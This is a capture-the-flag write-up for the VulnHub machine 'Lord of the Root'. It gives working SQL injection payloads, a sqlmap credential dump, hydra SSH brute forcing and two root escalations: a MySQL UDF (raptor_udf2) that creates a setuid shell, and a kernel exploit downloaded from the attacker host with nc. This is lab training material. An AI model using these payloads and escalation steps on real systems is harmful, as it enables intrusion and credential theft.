# Recon
- Only TCP/22 - SSH is up

## TCP/22 - SSH 
### Port Knocking
1. Connect to SSH
	![](images/Pasted%20image%2020220125010651.png)
	- Could be port knocking?
2. Port Knock
	```
	┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit]
	└─# knock -v $ip 1 2 3; 
	hitting tcp 192.168.236.10:1
	hitting tcp 192.168.236.10:2
	hitting tcp 192.168.236.10:3
	```
### NMAP  
- Check for newly opened ports
	```
	┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit]
	└─# nmap $ip -p-
	Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-25 01:08 +08
	Nmap scan report for 192.168.236.10
	Host is up (0.00044s latency).
	Not shown: 65533 filtered tcp ports (no-response)
	PORT     STATE SERVICE
	22/tcp   open  ssh
	1337/tcp open  waste
	MAC Address: 08:00:27:FF:4B:98 (Oracle VirtualBox virtual NIC)

	Nmap done: 1 IP address (1 host up) scanned in 104.95 seconds
	```
	- `TCP/1337`


## TCP/1337 - HTTP
### NMAP 
- Do a complete scan on `TCP/1337`
	```
	┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit]
	└─# nmap -sV -sC -A $ip -p 1337 
	Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-25 01:23 +08
	Nmap scan report for 192.168.236.10
	Host is up (0.00047s latency).

	PORT     STATE SERVICE VERSION
	1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
	|_http-title: Site doesn't have a title (text/html).
	|_http-server-header: Apache/2.4.7 (Ubuntu)
	MAC Address: 08:00:27:FF:4B:98 (Oracle VirtualBox virtual NIC)
	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
	Device type: general purpose
	Running: Linux 3.X|4.X
	OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
	OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4
	Network Distance: 1 hop
	```
	- `HTTP`
### FFUF 
```
┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit]
└─# ffuf -u http://$ip:1337/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php' -fw 21

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.236.10:1337/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 21
________________________________________________

                        [Status: 200, Size: 64, Words: 3, Lines: 4]
404.html                [Status: 200, Size: 116, Words: 3, Lines: 5]
images                  [Status: 301, Size: 323, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
:: Progress: [18460/18460] :: Job [1/1] :: 4242 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
- `404.html`
- `images`
- `index.html`
# Initial Foothold
## TCP/80 - HTTP - SQLi (Blind) Database Enumeration
1. View enumerated directories
	- `index.html`
		![](images/Pasted%20image%2020220125013623.png)
	- `404.html`
	![](images/Pasted%20image%2020220125014634.png)
		- Hidden Text
	- `images`
		![](images/Pasted%20image%2020220125013837.png)
2. Download all images & Analyze for hidden text/file
	- Could not find any
3. Decode hidden text
	```
	┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit]
	└─# echo -n THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh | base64 -d
	Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!
	┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit]
	└─# echo -n THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh | base64 -d | base64 -d
	/978345210/index.phpbase64: invalid input
	```
	- `/978345210/index.php`
4. Proceed to `/978345210/index.php`
	![](images/Pasted%20image%2020220125015001.png)
5. Tried to bruteforce it, did not work
6. [Try SQLi Payloads](https://github.com/payloadbox/sql-injection-payload-list)
7. Try Time Based SQLi
	```
	'or sleep(5)#
	```
	- It worked
7. Try SQLi Auth Bypass payload
	```
	1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
	```
	![](images/Pasted%20image%2020220125023505.png)
	![](images/Pasted%20image%2020220125030816.png)
	- Successfully login, could not do anything w/ the login apge
	- Instead of Authentication Bypass, we have to enumerate the database
8. Run SQLMap
	```
	┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit/SQL]
	└─# sqlmap -r sqli.txt --dump --output-dir=$(pwd)/sqlmap -v 5

	Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 7506 FROM (SELECT(SLEEP(5)))vOBo) AND 'enuE'='enuE&password=test&submit= Login

	Database: Webapp
	Table: Users
	[5 entries]
	+----+------------------+----------+
	| id | password         | username |
	+----+------------------+----------+
	| 1  | iwilltakethering | frodo    |
	| 2  | MyPreciousR00t   | smeagol  |
	| 3  | AndMySword       | aragorn  |
	| 4  | AndMyBow         | legolas  |
	| 5  | AndMyAxe         | gimli    |
	+----+------------------+----------+
	```
9. Create wordlist
	```
	┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit/SQL]
	└─# cat sqlmap/192.168.236.10/dump/Webapp/Users.csv | cut -d ',' -f2 | sed 's/password//g' | awk 'NF' > passwords.txt
	
	┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit/SQL]
	└─# cat sqlmap/192.168.236.10/dump/Webapp/Users.csv | cut -d ',' -f3 | sed 's/username//g' | awk 'NF' > usernames.txt
	
	┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit/SQL]
	└─# cat usernames.txt 
	frodo
	smeagol
	aragorn
	legolas
	gimli
	┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit/SQL]
	└─# cat passwords.txt 
	iwilltakethering
	MyPreciousR00t
	AndMySword
	AndMyBow
	```
	
## TCP/22 - SSH - Bruteforce
1.  Bruteforce SSH
	```
	┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit/SQL]
	└─# hydra -L usernames.txt -P passwords.txt ssh://$ip -e nsr
	Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

	Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-25 04:16:37
	[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
	[DATA] max 16 tasks per 1 server, overall 16 tasks, 40 login tries (l:5/p:8), ~3 tries per task
	[DATA] attacking ssh://192.168.236.10:22/
	[22][ssh] host: 192.168.236.10   login: smeagol   password: MyPreciousR00t
	1 of 1 target successfully completed, 1 valid password found
	Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-25 04:16:43
	```
	- smeagol:MyPreciousR00t
2. Access SSH w/ smeagol:MyPreciousR00t
	![](images/Pasted%20image%2020220125041805.png)

# Privilege Escalation 
## Root - Via MySQL running as Root
1. Linpeas
	![](images/Pasted%20image%2020220125042356.png)
2. Check ASLR
	```
	smeagol@LordOfTheRoot:/SECRET/door1$ cat /proc/sys/kernel/randomize_va_space
	2
	```
	- ASLR is enabled, hard/unable to do BOF
3. Check system processes running as root
	```
	smeagol@LordOfTheRoot:/SECRET/door1$ ps aux | grep root
	...
	root      1183  0.0  0.8 327004  8748 ?        Ssl  16:31   0:11 /usr/sbin/mysqld
	...
	```
	![](images/Pasted%20image%2020220125050305.png)
	- `mysqld` running as root
4. Find SQL Credentials
	```
	smeagol@LordOfTheRoot:/var/www$ grep -Rnw $(pwd)/*/* -ie "sql" --color=always 2>/dev/null
	
	/var/www/978345210/login.php:19:		$sql="select username, password from Users where username='".$username."' AND password='".$password."';";
	/var/www/978345210/login.php:20:		//echo $sql;
	/var/www/978345210/login.php:21:    
	```
	- `/var/www/978345210/login.php`
5. View `login.php`
	![](images/Pasted%20image%2020220125050453.png)
	- root:darkshadow
6. Access mysql w/ root:darkshadow
7. MySQL running as root exploit
	- https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c
	- https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf
8. Exploit
	1. Download `raptor_udf2.c`
		```
		wget https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c
		```
	1. Compile `raptor_udf2.c`
		```
		smeagol@LordOfTheRoot:/tmp$ gcc -g -c raptor_udf2.c
		smeagol@LordOfTheRoot:/tmp$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
		```
	3. Access mysql
		```
		mysql -u root -p darkshadow
		```
	3. Import `raptor_udf.so`
		```
		mysql> create table foo(line blob);
		Query OK, 0 rows affected (0.00 sec)
		
		mysql> insert into foo values(load_file('/tmp/raptor_udf2.so'));
		Query OK, 1 row affected (0.00 sec)

		mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
		Query OK, 1 row affected (0.00 sec)

		mysql> create function do_system returns integer soname 'raptor_udf2.so';
		Query OK, 0 rows affected (0.00 sec)
		
		mysql> select * from mysql.func;
		+-----------+-----+----------------+----------+
		| name      | ret | dl             | type     |
		+-----------+-----+----------------+----------+
		| do_system |   2 | raptor_udf2.so | function |
		+-----------+-----+----------------+----------+
		1 row in set (0.00 sec)
		```
	4. Create rootbash
		```
		select do_system('cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash');
		```
		![](images/Pasted%20image%2020220125162255.png)
9. Check if `rootbash` exists
	```
	smeagol@LordOfTheRoot:/tmp$ ls -la
	total 1004
	drwxrwxrwt  4 root    root      4096 Jan 25 08:57 .
	drwxr-xr-x 23 root    root      4096 Sep 22  2015 ..
	drwxrwxrwt  2 root    root      4096 Jan 25 07:52 .ICE-unix
	-rw-rw-r--  1 smeagol smeagol   3314 Jan 25 00:27 raptor_udf2.c
	-rw-rw-r--  1 smeagol smeagol   3192 Jan 25 08:46 raptor_udf2.o
	-rwxrwxr-x  1 smeagol smeagol   8418 Jan 25 08:46 raptor_udf2.so
	-rwsr-s--x  1 root    root    986672 Jan 25 08:56 rootbash
	-r--r--r--  1 root    root        11 Jan 25 07:52 .X0-lock
	drwxrwxrwt  2 root    root      4096 Jan 25 07:52 .X11-unix
	smeagol@LordOfTheRoot:/tmp$ 
	```
10. Obtain root shell
	![](images/Pasted%20image%2020220125162422.png)
11. Flag
	```
	rootbash-4.3# cat Flag.txt 
	“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
	– Gandalf
	rootbash-4.3# 
	```

## Root - Via Kernel Exploit
1. Linpeas
	![](images/Pasted%20image%2020220125174639.png)
	- `3.19.0-25-generic`
	- `Ubuntu 14.04`
2. Find exploits for `3.19.0-25-generic, Ubuntu 14.04`
	- https://www.exploit-db.com/exploits/39166
3. Transfer to target & exploit
	```
	smeagol@LordOfTheRoot:/tmp$ nc 192.168.236.4 4444 > 39166.c
	smeagol@LordOfTheRoot:/tmp$ gcc 39166.c -o exploit
	smeagol@LordOfTheRoot:/tmp$ ./exploit
	root@LordOfTheRoot:/tmp# 
	```
	![](images/Pasted%20image%2020220125180356.png)
	
---
Tags: #port-knocking #exploit/sqli/database-enum #linux-priv-esc/mysql 

---